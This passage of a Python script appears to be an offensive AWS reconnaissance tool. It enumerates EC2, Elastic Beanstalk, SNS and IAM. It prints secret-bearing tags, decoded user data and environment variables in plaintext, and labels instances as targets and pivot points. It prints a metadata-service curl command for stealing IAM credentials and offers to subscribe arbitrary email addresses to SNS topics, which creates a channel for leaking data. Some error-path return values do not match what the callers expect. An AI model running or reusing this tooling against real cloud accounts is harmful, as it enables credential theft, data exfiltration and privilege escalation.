                                snapshot_id = volume.get('SnapshotId')
                                if snapshot_id:
                                    print(f"    {Fore.CYAN}Snapshot ID: {snapshot_id}{Style.RESET_ALL}")
                    except Exception as e:
                        logger.debug(f"Error getting volume details for {volume_id}: {e}")
            
            # Tags (may contain sensitive information)
            tags = instance.get('Tags', [])
            if tags:
                print(f"\n{Fore.YELLOW}🏷️ Tags (POTENTIAL SENSITIVE INFO):{Style.RESET_ALL}")
                for tag in tags:
                    key = tag.get('Key', '')
                    value = tag.get('Value', '')
                    
                    # Highlight potentially sensitive tags
                    if any(keyword in key.lower() for keyword in ['password', 'secret', 'key', 'token', 'credential']):
                        print(f"  {Fore.RED}🚨 {key}: {value} (SENSITIVE){Style.RESET_ALL}")
                        logger.warning(f"Potentially sensitive tag on {instance_id}: {key}={value}")
                    elif key.lower() in ['name', 'environment', 'project', 'owner']:
                        print(f"  {Fore.CYAN}{key}: {value}{Style.RESET_ALL}")
                    else:
                        print(f"  {Fore.GREEN}{key}: {value}{Style.RESET_ALL}")
            
            # User Data (often contains sensitive bootstrapping info)
            try:
                user_data_response = ec2_client.describe_instance_attribute(
                    InstanceId=instance_id,
                    Attribute='userData'
                )
                user_data = user_data_response.get('UserData', {}).get('Value')
                if user_data:
                    print(f"\n{Fore.RED}📝 User Data (BOOTSTRAP SECRETS):{Style.RESET_ALL}")
                    # Decode base64 user data
                    import base64
                    try:
                        decoded_user_data = base64.b64decode(user_data).decode('utf-8')
                        # Show first few lines
                        lines = decoded_user_data.split('\n')[:5]
                        for line in lines:
                            if line.strip():
                                print(f"  {Fore.RED}{line[:100]}{'...' if len(line) > 100 else ''}{Style.RESET_ALL}")
                        if len(decoded_user_data.split('\n')) > 5:
                            print(f"  {Fore.YELLOW}... (truncated, {len(decoded_user_data)} total characters){Style.RESET_ALL}")
                        logger.warning(f"Instance {instance_id} has user data (potential secrets)")
                    except Exception as e:
                        print(f"  {Fore.YELLOW}Base64 encoded data present (decode manually){Style.RESET_ALL}")
            except Exception as e:
                logger.debug(f"Error getting user data for {instance_id}: {e}")
            
            # System information summary for running instances
            if instance_state == 'running':
                print(f"\n{Fore.RED}🎯 PENETRATION TESTING SUMMARY:{Style.RESET_ALL}")
                if public_ip:
                    print(f"  {Fore.RED}• Primary Target: {public_ip} (External){Style.RESET_ALL}")
                if private_ip:
                    print(f"  {Fore.YELLOW}• Internal Target: {private_ip} (Pivot point){Style.RESET_ALL}")
                
                # Common ports to check based on platform
                platform = instance.get('Platform', '').lower()
                if 'windows' in platform:
                    print(f"  {Fore.CYAN}• Suggested ports: 3389 (RDP), 445 (SMB), 5985 (WinRM){Style.RESET_ALL}")
                else:
                    print(f"  {Fore.CYAN}• Suggested ports: 22 (SSH), 80 (HTTP), 443 (HTTPS){Style.RESET_ALL}")
                
                if instance.get('KeyName'):
                    print(f"  {Fore.YELLOW}• SSH Key: {instance['KeyName']} (find private key){Style.RESET_ALL}")
                
                # IAM-based attack vectors
                if iam_instance_profile:
                    print(f"  {Fore.RED}• IAM Profile Attack: Compromise instance → Assume role → Escalate privileges{Style.RESET_ALL}")
                    print(f"  {Fore.RED}• Metadata Service: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/{Style.RESET_ALL}")
        
        # Region summary
        print(f"\n{Fore.GREEN}📊 {region} EC2 Summary:{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}Total instances: {len(instances)}{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}Running instances: {running_instances}{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}EBS volumes: {total_volumes}{Style.RESET_ALL}")
        print(f"  {Fore.YELLOW}Security groups: {len(security_groups_seen)}{Style.RESET_ALL}")
        
        logger.info(f"Region {region} EC2 analysis complete: {len(instances)} instances ({running_instances} running), {total_volumes} volumes")

        region_entry = {
            "instances": len(instances),
            "running": running_instances,
            "volumes": total_volumes,
            "security_groups": list(security_groups_seen),
        }
        output_data["ec2"]["regions"][region] = region_entry
        # right after processing an instance
        instance_entry = {
            "region": region,
            "id": instance_id,
            "state": instance_state,
            "public_ip":  public_ip or "",
            "private_ip": private_ip or "",
            "type":       instance.get("InstanceType", ""),
            "ami":        instance.get("ImageId", ""),
            "key_pair":   instance.get("KeyName", ""),
            "iam_profile": profile_arn if iam_instance_profile else "",
            "security_groups": [sg["GroupId"] for sg in security_groups],
            "volumes":   [bd["Ebs"]["VolumeId"]
                        for bd in block_devices if bd.get("Ebs")],
        }
        output_data.setdefault("ec2", {}).setdefault("instances", []).append(instance_entry)

        return len(instances), running_instances, total_volumes, len(security_groups_seen)
        
    except Exception as e:
        error_msg = f"Error during EC2 analysis in {region}: {e}"
        logger.error(error_msg)
        print(f"{Fore.RED}❌ {error_msg}{Style.RESET_ALL}")
        return 0, 0, 0, 0

def analyze_beanstalk_environments(session, current_region):
    """Comprehensive Elastic Beanstalk environment analysis"""
    print(f"\n{Fore.YELLOW}=== Elastic Beanstalk Analysis ==={Style.RESET_ALL}")
    logger.info("Starting Elastic Beanstalk analysis")
    
    # Ask user about region scanning
    search_all_regions = input(f"{Fore.GREEN}Search Beanstalk environments in all regions? (y/n) [default: current region only]: {Style.RESET_ALL}").strip().lower()
    
    regions_to_scan = []
    if search_all_regions in ['y', 'yes']:
        print(f"{Fore.BLUE}Getting all available regions...{Style.RESET_ALL}")
        try:
            ec2_client = session.client('ec2', region_name=current_region)
            regions_response = ec2_client.describe_regions()
            regions_to_scan = [region['RegionName'] for region in regions_response['Regions']]
            print(f"{Fore.GREEN}Will scan {len(regions_to_scan)} regions: {', '.join(regions_to_scan)}{Style.RESET_ALL}")
            logger.info(f"Scanning Beanstalk environments in all {len(regions_to_scan)} regions")
        except Exception as e:
            print(f"{Fore.RED}❌ Error getting regions dynamically: {e}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Falling back to hardcoded region list...{Style.RESET_ALL}")
            # Same hardcoded region list
            regions_to_scan = AWS_REGIONS
    else:
        regions_to_scan = [current_region]
        print(f"{Fore.CYAN}Scanning Beanstalk environments in current region: {current_region}{Style.RESET_ALL}")
        logger.info(f"Scanning Beanstalk environments in current region only: {current_region}")
    
    total_applications = 0
    total_environments = 0
    total_env_vars = 0
    
    # Process each region
    for region in regions_to_scan:
        print(f"\n{Fore.MAGENTA}🌍 Scanning region: {region}{Style.RESET_ALL}")
        logger.info(f"Scanning Beanstalk environments in region: {region}")
        
        try:
            beanstalk_client = session.client("elasticbeanstalk", region_name=region)
            region_apps, region_envs, region_vars, region_entries = analyze_beanstalk_in_region(beanstalk_client, region)
            total_applications += region_apps
            total_environments += region_envs
            total_env_vars += region_vars
            output_data["beanstalk"]["applications"].extend(region_entries)
            for entry in region_entries:
                output_data["beanstalk"]["environments"].extend(entry.get("environments", []))
            if region not in output_data["metadata"]["regions_scanned"]:
                output_data["metadata"]["regions_scanned"].append(region)
            
        except Exception as e:
            error_msg = f"Error scanning Beanstalk in region {region}: {e}"
            logger.error(error_msg)
            print(f"{Fore.RED}❌ {error_msg}{Style.RESET_ALL}")
    
    # Final summary
    print(f"\n{Fore.GREEN}🌍 Multi-Region Beanstalk Summary:{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}Regions scanned: {len(regions_to_scan)}{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}Total applications found: {total_applications}{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}Total environments found: {total_environments}{Style.RESET_ALL}")
    print(f"  {Fore.RED}Total environment variables found: {total_env_vars}{Style.RESET_ALL}")
    
    logger.info(f"Beanstalk analysis complete across {len(regions_to_scan)} regions: {total_applications} apps, {total_environments} environments, {total_env_vars} env vars")

def analyze_beanstalk_in_region(beanstalk_client, region):
    """Analyze Beanstalk environments in a specific region"""
    try:
        # Get all applications
        print(f"{Fore.BLUE}Discovering Beanstalk applications in {region}...{Style.RESET_ALL}")
        applications = beanstalk_client.describe_applications()
        apps = applications.get('Applications', [])
        
        if not apps:
            print(f"{Fore.YELLOW}No Beanstalk applications found in {region}.{Style.RESET_ALL}")
            logger.info(f"No Beanstalk applications found in {region}")
            return 0, 0, 0
        
        print(f"{Fore.GREEN}Found {len(apps)} Beanstalk applications in {region}{Style.RESET_ALL}")
        logger.info(f"Found {len(apps)} Beanstalk applications in {region}")
        
        total_environments = 0
        total_env_vars = 0
        app_entries = []
        
        # Process each application
        for app in apps:
            app_name = app['ApplicationName']
            print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}🚀 Application: {app_name}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
            
            # Application details
            print(f"{Fore.MAGENTA}📋 Application Information:{Style.RESET_ALL}")
            print(f"  {Fore.GREEN}Name: {app_name}{Style.RESET_ALL}")
            print(f"  {Fore.GREEN}Description: {app.get('Description', 'N/A')}{Style.RESET_ALL}")
            print(f"  {Fore.GREEN}Date Created: {app.get('DateCreated', 'N/A')}{Style.RESET_ALL}")
            print(f"  {Fore.GREEN}Date Updated: {app.get('DateUpdated', 'N/A')}{Style.RESET_ALL}")
            
            # Get application versions
            try:
                versions = beanstalk_client.describe_application_versions(ApplicationName=app_name)
                version_list = versions.get('ApplicationVersions', [])
                if version_list:
                    print(f"\n{Fore.BLUE}📦 Application Versions ({len(version_list)} total):{Style.RESET_ALL}")
                    for version in version_list[:5]:  # Show first 5 versions
                        print(f"  {Fore.GREEN}• {version['VersionLabel']} - {version.get('Description', 'No description')}{Style.RESET_ALL}")
                        if version.get('SourceBundle'):
                            print(f"    {Fore.CYAN}Source: {version['SourceBundle']['S3Bucket']}/{version['SourceBundle']['S3Key']}{Style.RESET_ALL}")
                    if len(version_list) > 5:
                        print(f"  {Fore.YELLOW}... and {len(version_list) - 5} more versions{Style.RESET_ALL}")
            except Exception as e:
                logger.error(f"Error getting versions for {app_name}: {e}")
            
            # Get environments for this application
            try:
                environments = beanstalk_client.describe_environments(ApplicationName=app_name)
                envs = environments.get('Environments', [])
                
                if not envs:
                    print(f"\n{Fore.YELLOW}No environments found for application {app_name}{Style.RESET_ALL}")
                    continue
                
                print(f"\n{Fore.BLUE}🌍 Environments ({len(envs)} total):{Style.RESET_ALL}")
                total_environments += len(envs)
                
                env_names = []
                env_var_map = {}

                # Process each environment
                for env in envs:
                    env_name = env['EnvironmentName']
                    env_id = env['EnvironmentId']
                    env_names.append(env_name)
                    
                    print(f"\n  {Fore.CYAN}--- Environment: {env_name} ---{Style.RESET_ALL}")
                    print(f"  {Fore.GREEN}Environment ID: {env_id}{Style.RESET_ALL}")
                    print(f"  {Fore.GREEN}Status: {env.get('Status', 'N/A')}{Style.RESET_ALL}")
                    print(f"  {Fore.GREEN}Health: {env.get('Health', 'N/A')}{Style.RESET_ALL}")
                    print(f"  {Fore.GREEN}Platform: {env.get('PlatformArn', env.get('SolutionStackName', 'N/A'))}{Style.RESET_ALL}")
                    print(f"  {Fore.GREEN}Date Created: {env.get('DateCreated', 'N/A')}{Style.RESET_ALL}")
                    print(f"  {Fore.GREEN}Date Updated: {env.get('DateUpdated', 'N/A')}{Style.RESET_ALL}")
                    
                    if env.get('CNAME'):
                        print(f"  {Fore.YELLOW}🌐 URL: {env['CNAME']}{Style.RESET_ALL}")
                    
                    if env.get('EndpointURL'):
                        print(f"  {Fore.YELLOW}🔗 Endpoint: {env['EndpointURL']}{Style.RESET_ALL}")
                    
                    # Get environment configuration (this contains environment variables)
                    try:
                        config_settings = beanstalk_client.describe_configuration_settings(
                            ApplicationName=app_name,
                            EnvironmentName=env_name
                        )
                        
                        config_options = config_settings.get('ConfigurationSettings', [])
                        if config_options:
                            options = config_options[0].get('OptionSettings', [])
                            
                            # Filter for environment variables and other sensitive configs
                            sensitive_options = []
                            env_vars = []
                            
                            for option in options:
                                namespace = option.get('Namespace', '')
                                option_name = option.get('OptionName', '')
                                value = option.get('Value', '')
                                
                                # Environment variables
                                if namespace == 'aws:elasticbeanstalk:application:environment':
                                    env_vars.append((option_name, value))
                                
                                # Other potentially sensitive configurations
                                elif any(keyword in namespace.lower() or keyword in option_name.lower() 
                                       for keyword in ['secret', 'key', 'password', 'token', 'credential']):
                                    sensitive_options.append((namespace, option_name, value))
                            
                            # Display environment variables
                            if env_vars:
                                print(f"\n  {Fore.RED}🔑 Environment Variables (SENSITIVE!):{Style.RESET_ALL}")
                                total_env_vars += len(env_vars)
                                for var_name, var_value in env_vars:
                                    print(f"    {Fore.RED}{var_name}: {var_value}{Style.RESET_ALL}")
                                logger.warning(f"Found {len(env_vars)} environment variables in {env_name}")
                                env_var_map[env_name] = [name for name, _ in env_vars]
                            else:
                                print(f"\n  {Fore.BLUE}Environment Variables: None{Style.RESET_ALL}")
                            
                            # Display other sensitive configurations
                            if sensitive_options:
                                print(f"\n  {Fore.YELLOW}🔐 Other Sensitive Configurations:{Style.RESET_ALL}")
                                for namespace, opt_name, opt_value in sensitive_options:
                                    print(f"    {Fore.YELLOW}{namespace}:{opt_name} = {opt_value}{Style.RESET_ALL}")
                            
                            # Show some other interesting configurations
                            interesting_configs = []
                            for option in options:
                                namespace = option.get('Namespace', '')
                                option_name = option.get('OptionName', '')
                                value = option.get('Value', '')
                                
                                if namespace in [
                                    'aws:elasticbeanstalk:application',
                                    'aws:elasticbeanstalk:container:nodejs:staticfiles',
                                    'aws:elasticbeanstalk:container:python:staticfiles',
                                    'aws:elasticbeanstalk:healthreporting:system'
                                ]:
                                    interesting_configs.append((namespace, option_name, value))
                            
                            if interesting_configs:
                                print(f"\n  {Fore.CYAN}⚙️ Application Configuration (sample):{Style.RESET_ALL}")
                                for namespace, opt_name, opt_value in interesting_configs[:5]:
                                    print(f"    {Fore.CYAN}{namespace}:{opt_name} = {opt_value}{Style.RESET_ALL}")
                                if len(interesting_configs) > 5:
                                    print(f"    {Fore.BLUE}... and {len(interesting_configs) - 5} more config options{Style.RESET_ALL}")
                                    
                    except Exception as e:
                        error_msg = f"Error getting configuration for environment {env_name}: {e}"
                        logger.error(error_msg)
                        print(f"    {Fore.RED}❌ {error_msg}{Style.RESET_ALL}")
                    
                    # Get environment resources (EC2 instances, load balancers, etc.)
                    try:
                        resources = beanstalk_client.describe_environment_resources(EnvironmentName=env_name)
                        env_resources = resources.get('EnvironmentResources', {})
                        
                        instances = env_resources.get('Instances', [])
                        load_balancers = env_resources.get('LoadBalancers', [])
                        
                        if instances or load_balancers:
                            print(f"\n  {Fore.BLUE}🏗️ Environment Resources:{Style.RESET_ALL}")
                            
                            if instances:
                                print(f"    {Fore.GREEN}EC2 Instances: {len(instances)}{Style.RESET_ALL}")
                                for instance in instances[:3]:  # Show first 3 instances
                                    print(f"      {Fore.CYAN}• {instance['Id']}{Style.RESET_ALL}")
                                if len(instances) > 3:
                                    print(f"      {Fore.BLUE}... and {len(instances) - 3} more instances{Style.RESET_ALL}")
                            
                            if load_balancers:
                                print(f"    {Fore.GREEN}Load Balancers: {len(load_balancers)}{Style.RESET_ALL}")
                                for lb in load_balancers:
                                    print(f"      {Fore.CYAN}• {lb['Name']}{Style.RESET_ALL}")
                                    
                    except Exception as e:
                        logger.debug(f"Error getting resources for environment {env_name}: {e}")
                        
            except Exception as e:
                error_msg = f"Error getting environments for application {app_name}: {e}"
                logger.error(error_msg)
                print(f"  {Fore.RED}❌ {error_msg}{Style.RESET_ALL}")

            app_entries.append({
                "region": region,
                "application": app_name,
                "environments": env_names,
                "env_var_keys": env_var_map,
            })
        
        # Region summary
        print(f"\n{Fore.GREEN}📊 {region} Beanstalk Summary:{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}Applications: {len(apps)}{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}Environments: {total_environments}{Style.RESET_ALL}")
        print(f"  {Fore.RED}Environment variables found: {total_env_vars}{Style.RESET_ALL}")
        
        logger.info(f"Region {region} Beanstalk analysis complete: {len(apps)} apps, {total_environments} environments, {total_env_vars} env vars")
        
        return len(apps), total_environments, total_env_vars, app_entries
        
    except Exception as e:
        error_msg = f"Error during Beanstalk analysis in {region}: {e}"
        logger.error(error_msg)
        print(f"{Fore.RED}❌ {error_msg}{Style.RESET_ALL}")
        return 0, 0, 0, []

def analyze_sns_topics_in_region(sns_client, region):
    """Analyze SNS topics in a specific region"""
    topics_found = 0
    subscribed_count = 0
    topic_entries = []
    
    try:
        print(f"\n{Fore.BLUE}📡 Analyzing SNS topics in {region}...{Style.RESET_ALL}")
        logger.info(f"Starting SNS topic analysis in region: {region}")
        
        # List all SNS topics
        paginator = sns_client.get_paginator('list_topics')
        topics = []
        
        for page in paginator.paginate():
            topics.extend(page.get('Topics', []))
        
        if not topics:
            print(f"  {Fore.YELLOW}No SNS topics found in {region}{Style.RESET_ALL}")
            logger.info(f"No SNS topics found in region: {region}")
            return 0, 0
        
        topics_found = len(topics)
        print(f"  {Fore.GREEN}Found {topics_found} SNS topic(s) in {region}{Style.RESET_ALL}")
        logger.info(f"Found {topics_found} SNS topics in region: {region}")
        
        # Analyze each topic
        for i, topic in enumerate(topics, 1):
            topic_arn = topic['TopicArn']
            topic_name = topic_arn.split(':')[-1]
            
            print(f"\n  {Fore.CYAN}[{i}/{topics_found}] Topic: {topic_name}{Style.RESET_ALL}")
            print(f"    {Fore.MAGENTA}ARN: {topic_arn}{Style.RESET_ALL}")
            
            try:
                # Get topic attributes
                attributes = sns_client.get_topic_attributes(TopicArn=topic_arn)
                attrs = attributes.get('Attributes', {})
                
                print(f"    {Fore.BLUE}Topic Details:{Style.RESET_ALL}")
                print(f"      Display Name: {attrs.get('DisplayName', 'N/A')}")
                print(f"      Owner: {attrs.get('Owner', 'N/A')}")
                print(f"      Subscriptions Confirmed: {attrs.get('SubscriptionsConfirmed', 'N/A')}")
                print(f"      Subscriptions Pending: {attrs.get('SubscriptionsPending', 'N/A')}")
                print(f"      Subscriptions Deleted: {attrs.get('SubscriptionsDeleted', 'N/A')}")
                print(f"      Policy: {attrs.get('Policy', 'N/A')[:100]}{'...' if len(attrs.get('Policy', '')) > 100 else ''}")
                
                # Get subscriptions
                try:
                    subs_paginator = sns_client.get_paginator('list_subscriptions_by_topic')
                    subscriptions = []
                    
                    for sub_page in subs_paginator.paginate(TopicArn=topic_arn):
                        subscriptions.extend(sub_page.get('Subscriptions', []))
                    
                    if subscriptions:
                        print(f"    {Fore.YELLOW}Existing Subscriptions ({len(subscriptions)}):{Style.RESET_ALL}")
                        for sub in subscriptions:
                            protocol = sub.get('Protocol', 'unknown')
                            endpoint = sub.get('Endpoint', 'unknown')
                            # Mask email for privacy in logs
                            if protocol == 'email':
                                masked_endpoint = endpoint[:3] + '***@' + endpoint.split('@')[-1] if '@' in endpoint else endpoint
                                print(f"      - {protocol}: {masked_endpoint}")
                            else:
                                print(f"      - {protocol}: {endpoint}")
                    else:
                        print(f"    {Fore.YELLOW}No existing subscriptions{Style.RESET_ALL}")
                        
                except Exception as e:
                    print(f"    {Fore.RED}❌ Error getting subscriptions: {e}{Style.RESET_ALL}")
                    logger.error(f"Error getting subscriptions for {topic_arn}: {e}")
                
                # Log topic details
                logger.info(f"Topic analyzed: {topic_name} - Confirmed subs: {attrs.get('SubscriptionsConfirmed', 'N/A')}")
                
            except Exception as e:
                print(f"    {Fore.RED}❌ Error getting topic attributes: {e}{Style.RESET_ALL}")
                logger.error(f"Error getting attributes for topic {topic_arn}: {e}")
            
            # Ask user if they want to subscribe
            subscribe_choice = input(f"\n    {Fore.GREEN}Do you want to subscribe to topic '{topic_name}'? (y/N): {Style.RESET_ALL}").strip().lower()
            
            if subscribe_choice in ['y', 'yes']:
                email = input(f"    {Fore.CYAN}Enter email address to subscribe: {Style.RESET_ALL}").strip()
                
                if email and '@' in email:
                    try:
                        response = sns_client.subscribe(
                            TopicArn=topic_arn,
                            Protocol='email',
                            Endpoint=email
                        )
                        
                        subscription_arn = response.get('SubscriptionArn', 'pending confirmation')
                        print(f"    {Fore.GREEN}✅ Subscription request sent successfully!{Style.RESET_ALL}")
                        print(f"    {Fore.BLUE}Subscription ARN: {subscription_arn}{Style.RESET_ALL}")
                        print(f"    {Fore.YELLOW}⚠️  Check your email to confirm the subscription{Style.RESET_ALL}")
                        
                        subscribed_count += 1
                        logger.info(f"Successfully subscribed {email} to topic {topic_name}")
                        
                    except Exception as e:
                        error_msg = f"Error subscribing to topic {topic_name}: {e}"
                        print(f"    {Fore.RED}❌ {error_msg}{Style.RESET_ALL}")
                        logger.error(error_msg)
                else:
                    print(f"    {Fore.RED}❌ Invalid email address{Style.RESET_ALL}")

            topic_entries.append({
                "region": region,
                "name": topic_name,
                "arn": topic_arn,
                "subscription_count": len(subscriptions),
            })
            
            print()  # Add spacing between topics
            
    except Exception as e:
        error_msg = f"Error analyzing SNS topics in region {region}: {e}"
        logger.error(error_msg)
        print(f"  {Fore.RED}❌ {error_msg}{Style.RESET_ALL}")
        return 0, 0, []

    return topics_found, subscribed_count, topic_entries


def analyze_sns_topics(session, current_region):
    """Comprehensive SNS topics analysis across regions"""
    print(f"\n{Fore.YELLOW}=== SNS Topics Analysis ==={Style.RESET_ALL}")
    logger.info("Starting SNS topics analysis")
    
    # Ask user about region scanning
    search_all_regions = input(f"{Fore.GREEN}Search SNS topics in all regions? (y/n) [default: current region only]: {Style.RESET_ALL}").strip().lower()
    
    regions_to_scan = []
    if search_all_regions in ['y', 'yes']:
        print(f"{Fore.BLUE}Getting all available regions...{Style.RESET_ALL}")
        try:
            ec2_client = session.client('ec2', region_name=current_region)
            print(f"{Fore.BLUE}Calling EC2 describe_regions()...{Style.RESET_ALL}")
            regions_response = ec2_client.describe_regions()
            regions_to_scan = [region['RegionName'] for region in regions_response['Regions']]
            print(f"{Fore.GREEN}Will scan {len(regions_to_scan)} regions: {', '.join(regions_to_scan)}{Style.RESET_ALL}")
            logger.info(f"Scanning SNS topics in all {len(regions_to_scan)} regions")
        except Exception as e:
            print(f"{Fore.RED}❌ Error getting regions dynamically: {e}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Falling back to hardcoded region list...{Style.RESET_ALL}")
            logger.error(f"Error getting regions: {e}")
            # Hardcoded region list based on user's requirements
            regions_to_scan = AWS_REGIONS
            print(f"{Fore.GREEN}Using {len(regions_to_scan)} hardcoded regions{Style.RESET_ALL}")
    else:
        regions_to_scan = [current_region]
        print(f"{Fore.CYAN}Scanning SNS topics in current region: {current_region}{Style.RESET_ALL}")
        logger.info(f"Scanning SNS topics in current region only: {current_region}")
    
    total_topics_found = 0
    total_subscribed = 0
    regions_with_topics = 0
    
    # Process each region
    for region in regions_to_scan:
        print(f"\n{Fore.MAGENTA}🌍 Scanning region: {region}{Style.RESET_ALL}")
        logger.info(f"Scanning SNS topics in region: {region}")
        
        try:
            sns_client = session.client("sns", region_name=region)
            region_topics, region_subscribed, topic_entries = analyze_sns_topics_in_region(sns_client, region)
            output_data["sns"]["topics"].extend(topic_entries)
            if region not in output_data["metadata"]["regions_scanned"]:
                output_data["metadata"]["regions_scanned"].append(region)
            
            if region_topics > 0:
                regions_with_topics += 1
                
            total_topics_found += region_topics
            total_subscribed += region_subscribed
            
        except Exception as e:
            error_msg = f"Error scanning region {region}: {e}"
            logger.error(error_msg)
            print(f"{Fore.RED}❌ {error_msg}{Style.RESET_ALL}")
    
    # Final summary
    print(f"\n{Fore.GREEN}🌍 Multi-Region SNS Summary:{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}Regions scanned: {len(regions_to_scan)}{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}Regions with topics: {regions_with_topics}{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}Total topics found: {total_topics_found}{Style.RESET_ALL}")
    print(f"  {Fore.GREEN}Total subscriptions made: {total_subscribed}{Style.RESET_ALL}")
    
    if total_subscribed > 0:
        print(f"  {Fore.YELLOW}⚠️  Remember to check your email(s) to confirm subscriptions!{Style.RESET_ALL}")
    
    logger.info(f"SNS analysis complete across {len(regions_to_scan)} regions: {total_topics_found} topics found, {total_subscribed} subscriptions made")


# Additional function to list all SNS subscriptions (useful for monitoring)
def list_all_sns_subscriptions(session, current_region):
    """List all SNS subscriptions across regions"""
    print(f"\n{Fore.YELLOW}=== All SNS Subscriptions ==={Style.RESET_ALL}")
    logger.info("Listing all SNS subscriptions")
    
    # Ask user about region scanning
    search_all_regions = input(f"{Fore.GREEN}List subscriptions in all regions? (y/n) [default: current region only]: {Style.RESET_ALL}").strip().lower()
    
    regions_to_scan = []
    if search_all_regions in ['y', 'yes']:
        try:
            ec2_client = session.client('ec2', region_name=current_region)
            regions_response = ec2_client.describe_regions()
            regions_to_scan = [region['RegionName'] for region in regions_response['Regions']]
        except Exception as e:
            print(f"{Fore.RED}❌ Error getting regions dynamically: {e}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Using hardcoded region list...{Style.RESET_ALL}")
            # Same hardcoded region list
            regions_to_scan =  AWS_REGIONS
    else:
        regions_to_scan = [current_region]
    
    total_subscriptions = 0
    
    for region in regions_to_scan:
        print(f"\n{Fore.MAGENTA}🌍 Region: {region}{Style.RESET_ALL}")
        
        try:
            sns_client = session.client("sns", region_name=region)
            
            paginator = sns_client.get_paginator('list_subscriptions')
            subscriptions = []
            
            for page in paginator.paginate():
                subscriptions.extend(page.get('Subscriptions', []))
            
            if subscriptions:
                print(f"  {Fore.GREEN}Found {len(subscriptions)} subscription(s){Style.RESET_ALL}")
                
                for i, sub in enumerate(subscriptions, 1):
                    topic_arn = sub.get('TopicArn', 'N/A')
                    topic_name = topic_arn.split(':')[-1] if topic_arn != 'N/A' else 'N/A'
                    protocol = sub.get('Protocol', 'N/A')
                    endpoint = sub.get('Endpoint', 'N/A')
                    
                    # Mask sensitive info
                    if protocol == 'email' and '@' in endpoint:
                        masked_endpoint = endpoint[:3] + '***@' + endpoint.split('@')[-1]
                    else:
                        masked_endpoint = endpoint
                    
                    print(f"    {Fore.CYAN}[{i}] Topic: {topic_name}{Style.RESET_ALL}")
                    print(f"        Protocol: {protocol}")
                    print(f"        Endpoint: {masked_endpoint}")
                    print(f"        Status: {sub.get('SubscriptionArn', 'Pending')}")
                    print()

                    output_data["sns"]["subscriptions"].append({
                        "region": region,
                        "topic_arn": topic_arn,
                        "protocol": protocol,
                        "endpoint": masked_endpoint,
                    })
                    if region not in output_data["metadata"]["regions_scanned"]:
                        output_data["metadata"]["regions_scanned"].append(region)
                
                total_subscriptions += len(subscriptions)
            else:
                print(f"  {Fore.YELLOW}No subscriptions found{Style.RESET_ALL}")
                
        except Exception as e:
            print(f"  {Fore.RED}❌ Error listing subscriptions: {e}{Style.RESET_ALL}")
            logger.error(f"Error listing subscriptions in region {region}: {e}")
    
    print(f"\n{Fore.GREEN}Total subscriptions across all regions: {total_subscriptions}{Style.RESET_ALL}")
    logger.info(f"Total SNS subscriptions found: {total_subscriptions}")

def analyze_role_permissions(iam_client, role_name):
    """Analyze and display all permissions for a given role.
       Returns a dict with managed_policies, inline_policies, permissions.
    """
    print(f"    {Fore.BLUE}📋 Analyzing permissions for role '{role_name}'...{Style.RESET_ALL}")

    # ── collectors for JSON output ──────────────────────────
    managed_details = []   # full docs for every attached managed policy
    inline_details  = []   # full docs for every inline policy
    all_permissions = []   # flat list of allowed actions

    try:
        # 1) Attached managed policies
        managed_policies = iam_client.list_attached_role_policies(
            RoleName=role_name
        ).get("AttachedPolicies", [])

        # 2) Inline policies
        inline_policies = iam_client.list_role_policies(
            RoleName=role_name
        ).get("PolicyNames", [])

        print(f"    {Fore.CYAN}  - Managed Policies: {len(managed_policies)}{Style.RESET_ALL}")
        print(f"    {Fore.CYAN}  - Inline Policies: {len(inline_policies)}{Style.RESET_ALL}")

        # ─────────────────────────────────────────────────────
        # Process MANAGED policies
        # ─────────────────────────────────────────────────────
        for policy in managed_policies:
            policy_arn  = policy["PolicyArn"]
            policy_name = policy["PolicyName"]
            print(f"    {Fore.YELLOW}    📄 Managed Policy: {policy_name}{Style.RESET_ALL}")
            print(f"    {Fore.CYAN}       ARN: {policy_arn}{Style.RESET_ALL}")

            try:
                versions = iam_client.list_policy_versions(PolicyArn=policy_arn)
                default_version = None

                print(f"    {Fore.BLUE}       Policy Versions:{Style.RESET_ALL}")
                for v in versions["Versions"]:
                    vid        = v["VersionId"]
                    is_default = v["IsDefaultVersion"]
                    cdate      = v["CreateDate"]
                    tag        = "(DEFAULT)" if is_default else ""
                    print(f"    {Fore.CYAN}         - Version {vid} {tag} - Created: {cdate}{Style.RESET_ALL}")
                    if is_default:
                        default_version = vid

                if default_version:
                    pv = iam_client.get_policy_version(
                        PolicyArn=policy_arn,
                        VersionId=default_version
                    )
                    doc = pv["PolicyVersion"]["Document"]

                    print(f"    {Fore.GREEN}       Default Version ({default_version}) Permissions:{Style.RESET_ALL}")
                    print_policy_document(doc, indent="         ")

                    # ╭─ collect for JSON
                    managed_details.append({
                        "name":            policy_name,
                        "arn":             policy_arn,
                        "default_version": default_version,
                        "document":        doc
                    })
                    # ╰─ extract allowed actions
                    if "Statement" in doc:
                        for stmt in doc["Statement"]:
                            if stmt.get("Effect") == "Allow":
                                actions = stmt.get("Action", [])
                                if isinstance(actions, str):
                                    actions = [actions]
                                all_permissions.extend(actions)

            except Exception as err:
                print(f"    {Fore.RED}       ❌ Error reading policy: {err}{Style.RESET_ALL}")

        # ─────────────────────────────────────────────────────
        # Process INLINE policies
        # ─────────────────────────────────────────────────────
        for policy_name in inline_policies:
            print(f"    {Fore.YELLOW}    📄 Inline Policy: {policy_name}{Style.RESET_ALL}")
            try:
                inline_policy = iam_client.get_role_policy(
                    RoleName=role_name, PolicyName=policy_name
                )
                doc = inline_policy["PolicyDocument"]

                print(f"    {Fore.GREEN}       Policy Document:{Style.RESET_ALL}")
                print_policy_document(doc, indent="         ")

                # collect full doc
